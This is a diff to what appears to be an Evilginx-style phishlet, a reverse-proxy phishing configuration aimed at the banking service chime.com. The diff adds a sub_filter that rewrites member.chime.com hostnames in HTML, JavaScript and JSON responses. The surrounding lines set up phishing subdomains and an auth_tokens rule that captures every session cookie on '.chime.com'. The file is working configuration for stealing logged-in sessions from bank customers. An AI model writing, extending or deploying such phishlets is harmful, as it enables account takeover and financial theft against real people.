@@ -7,7 +7,7 @@ proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'chime.com', session: true, is_landing: false, auto_filter: false}
 
 sub_filters:
-  
+  - {triggers_on: 'member.chime.com', orig_sub: 'member', domain: 'chime.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
 auth_tokens:
   - domain: '.chime.com'
     keys: ['.*,regexp']
